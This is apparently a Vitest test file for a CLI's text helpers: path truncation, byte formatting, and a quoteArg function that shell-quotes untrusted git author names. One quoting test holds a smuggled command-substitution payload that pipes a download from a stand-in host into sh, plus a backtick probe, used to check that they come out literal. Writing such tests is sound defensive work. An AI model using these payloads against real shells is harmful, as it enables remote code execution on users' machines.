import { describe, expect, it } from "vitest";

import { MIN_TAIL, formatBytes, formatBytesCeil, quoteArg, truncatePath } from "./text";

/**
 * TRUNCATING A PATH — which end of it the column can afford to lose.
 *
 * A path has two informative ends. Cutting from the left alone keeps the
 * filename and throws away the orientation: `…pplications/[id]/page.tsx` no
 * longer says whether the file is under `app/` or under `workers/`, which in a
 * monorepo is the first thing the reader wanted. So the head segment is bought
 * back for the price of a few columns — unless buying it would cost the
 * filename, at which point the filename wins.
 *
 * The width is asserted exactly, not approximately. These strings sit in padded
 * columns inside golden files, and a truncation that is one character over is a
 * card that wraps.
 */

const ELLIPSIS = "…";
/** 36 characters, four directories deep. */
const DEEP = "workers/src/handlers/webhook/push.ts";

describe("a path that fits is not touched", () => {
  it("returns it unchanged below the width", () => {
    expect(truncatePath("src/a.ts", 40, ELLIPSIS)).toBe("src/a.ts");
  });

  it("returns it unchanged AT the width — the boundary is inclusive", () => {
    expect(DEEP).toHaveLength(36);
    expect(truncatePath(DEEP, 36, ELLIPSIS)).toBe(DEEP);
  });

  it("cuts at one character over, and lands exactly on the width", () => {
    const cut = truncatePath(DEEP, 35, ELLIPSIS);
    expect(cut).not.toBe(DEEP);
    expect(cut).toHaveLength(35);
  });
});

describe("the middle is what goes", () => {
  it("keeps the first segment and as much of the tail as fits", () => {
    expect(truncatePath(DEEP, 24, ELLIPSIS)).toBe("workers/…webhook/push.ts");
  });

  it("keeps the first segment whatever the depth below it", () => {
    const cut = truncatePath("app/dashboard/[repoId]/coverage/page.tsx", 26, ELLIPSIS);
    expect(cut.startsWith("app/")).toBe(true);
    expect(cut.endsWith("page.tsx")).toBe(true);
    expect(cut).toHaveLength(26);
  });

  it("fills the column exactly, whatever the ellipsis costs", () => {
    // `--ascii` spends three characters where unicode spends one, and the tail
    // shrinks to pay for it rather than the line growing.
    for (const ellipsis of [ELLIPSIS, "..."]) {
      for (const width of [20, 24, 30, 35]) {
        expect(truncatePath(DEEP, width, ellipsis), `${ellipsis} at ${width}`).toHaveLength(width);
      }
    }
    expect(truncatePath(DEEP, 24, "...")).toBe("workers/...bhook/push.ts");
  });
});

describe("the filename always wins", () => {
  it("falls back to a left cut when the head would leave too little tail", () => {
    // One column apart, on either side of MIN_TAIL: at eight characters of
    // tail the head is still worth its price, at seven it is not.
    expect(MIN_TAIL).toBe(8);
    expect(truncatePath(DEEP, 17, ELLIPSIS)).toBe("workers/…/push.ts");
    expect(truncatePath(DEEP, 16, ELLIPSIS)).toBe("…webhook/push.ts");
  });

  it("falls back when the first segment is longer than the column", () => {
    const path = "a-very-long-first-directory-name/x.ts";
    const cut = truncatePath(path, 24, ELLIPSIS);
    expect(cut.startsWith(ELLIPSIS)).toBe(true);
    expect(cut.endsWith("x.ts")).toBe(true);
    expect(cut).toHaveLength(24);
  });

  it("falls back when there is no directory to keep", () => {
    const cut = truncatePath("a-single-very-long-filename-at-the-root.ts", 20, ELLIPSIS);
    expect(cut).toBe("…name-at-the-root.ts");
    expect(cut.endsWith(".ts")).toBe(true);
    expect(cut).toHaveLength(20);
  });

  it("degrades to the ellipsis itself rather than overflowing a tiny column", () => {
    expect(truncatePath(DEEP, 1, ELLIPSIS)).toBe(ELLIPSIS);
  });
});

/**
 * QUOTING AN ARGUMENT — a git author name is unauthenticated input.
 *
 * Every command the cards print is meant to be pasted back into a terminal,
 * and anybody who ever committed to a repository chose the name that will be
 * pasted. Double quotes leave `$`, backtick and `!` live to the shell, so the
 * safe form is single quotes with the standard `'\''` splice — and these
 * assertions hold the exact bytes, because "roughly quoted" is not a property.
 */
describe("quoteArg neutralizes what a shell would run", () => {
  it("leaves a plain token alone", () => {
    expect(quoteArg("priya")).toBe("priya");
    expect(quoteArg("priya@acme.dev")).toBe("priya@acme.dev");
  });

  it("single-quotes a name with spaces", () => {
    expect(quoteArg("Ada Lovelace")).toBe("'Ada Lovelace'");
  });

  it("makes a command-substitution name literal", () => {
    expect(quoteArg("$(curl evil.example|sh)")).toBe("'$(curl evil.example|sh)'");
    expect(quoteArg("`id`")).toBe("'`id`'");
  });

  it("splices an embedded single quote", () => {
    expect(quoteArg("O'Brien")).toBe("'O'\\''Brien'");
  });
});

/**
 * AN UPPER BOUND NEVER ROUNDS BELOW THE QUANTITY IT BOUNDS.
 *
 * "None the only name on more than 12K" over a 12.7K load is checkably false;
 * `formatBytesCeil` is the formatter for that sentence. Same display precision
 * as `formatBytes`, ceiling instead of nearest.
 */
describe("formatBytesCeil", () => {
  it("rounds a bound up where formatBytes would round down", () => {
    expect(formatBytes(12700)).toBe("12K");
    expect(formatBytesCeil(12700)).toBe("13K");
  });

  it("keeps one decimal below ten", () => {
    expect(formatBytesCeil(9500)).toBe("9.3K");
  });

  it("promotes a decimal ceiling that reaches ten to whole figures", () => {
    expect(formatBytesCeil(10230)).toBe("10K");
  });

  it("agrees with formatBytes on exact values", () => {
    expect(formatBytesCeil(1024)).toBe("1.0K");
    expect(formatBytesCeil(0)).toBe("0B");
  });
});
